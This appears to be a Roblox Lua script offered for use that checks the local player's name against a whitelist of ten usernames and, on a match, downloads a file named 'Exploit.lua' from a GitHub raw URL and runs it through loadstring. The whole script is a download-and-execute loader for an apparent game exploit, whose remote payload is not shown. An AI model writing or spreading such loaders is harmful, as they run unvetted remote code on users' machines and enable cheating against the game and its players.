local player = game.Players.LocalPlayer
local whitelistedpeople = {
    "0owah",
    "Ruitalix",
    "tezownsyou",
    "Negations",
    "TBANDOZZ",
    "zenthys",
    "77777MORTAL",
    "Provatel",
    "extvsthewrld",
    "vypreus"
   
   
}
for i,v in pairs (whitelistedpeople) do
    if player.Name == v then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/kyzwtf/Rawiri/main/Exploit.lua",true))();
    end
end
